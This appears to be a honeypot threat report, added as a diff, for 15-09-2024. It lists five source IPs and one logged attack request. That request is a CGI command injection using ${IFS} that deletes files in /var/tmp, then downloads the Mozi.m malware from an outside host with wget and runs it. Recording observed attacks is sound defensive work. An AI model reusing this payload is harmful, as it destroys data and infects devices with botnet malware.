@@ -1,0 +1,18 @@
+Top 5 IPs for 15-09-2024 :
+
+111.20.227.46
+159.89.161.66
+112.184.169.224
+114.220.25.175
+112.211.157.57
+
+
+Malware Observed:
+
+None
+
+
+Commands/exploits observed :
+
+
+GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://113.230.203.188:59773/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m
